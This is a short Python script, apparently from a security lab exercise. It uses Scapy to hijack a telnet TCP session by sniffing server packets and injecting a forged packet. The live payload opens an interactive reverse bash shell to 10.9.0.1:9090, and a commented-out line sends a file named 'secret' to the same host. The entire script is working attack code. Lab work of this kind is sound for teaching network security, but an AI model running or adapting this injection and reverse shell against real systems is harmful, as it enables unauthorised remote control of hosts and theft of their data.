#!/usr/bin/env python3

# Task 4 ----------------------------------------------------
# Reverse shell creation

from scapy.all import *
from scapy.layers.inet import IP, TCP

def spoof_tcp(pkt):
	#sniff telnet connection packets on the victim container
	#pkt[TCP].sport: 23, pkt[TCP].dport: user
	#pkt[IP].src: server ip, pkt[IP].dst: user's ip addr
	
	#spoof from the attacker impersonating user, so user to victim
	# ip = IP(src="10.9.0.6", dst="10.9.0.5")
	
	ip = IP(src=pkt[IP].dst, dst=pkt[IP].src) #user to server
	tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="A", seq=pkt[TCP].ack+5, ack=pkt[TCP].seq+len(pkt[TCP].payload))
	#data = "\r cat secret > /dev/tcp/10.9.0.1/9090 \r"
	
	data = "\r /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1 \r"
	pkt = ip/tcp/data
	#ls(pkt)
	send(pkt, iface="br-5f9aa6b242e3", verbose=0)

pkt=sniff(iface='br-5f9aa6b242e3', filter='tcp and src host 10.9.0.5 and src port 23', prn=spoof_tcp)

